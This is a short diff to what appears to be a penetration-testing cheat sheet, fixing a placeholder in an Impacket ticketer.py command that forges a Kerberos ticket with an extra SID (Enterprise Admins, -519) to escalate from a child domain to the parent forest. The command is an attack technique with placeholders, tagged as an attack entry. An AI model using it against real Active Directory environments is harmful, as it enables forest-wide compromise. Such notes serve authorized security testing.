@@ -12,5 +12,5 @@ ticketer.py -request -domain "<domain>" -user "<user>"
 ## Ticketer - Child to Parent
 #plateform/linux #target/remote #cat/ATTACK
 ```
-ticketer.py -aesKey '<child_krbtgt_aeskey>' -domain <CHILD_DOMAIN_NAME> -domain-sid <YOUR_DOMAIN_SID> -extra-sid <TARGET_DOMAIN_HERE>-519 Administrator -user-id 500
+ticketer.py -aesKey '<child_krbtgt_aeskey>' -domain <CHILD_DOMAIN_NAME> -domain-sid <YOUR_DOMAIN_SID> -extra-sid <TARGET_DOMAIN_SID>-519 Administrator -user-id 500
 ```
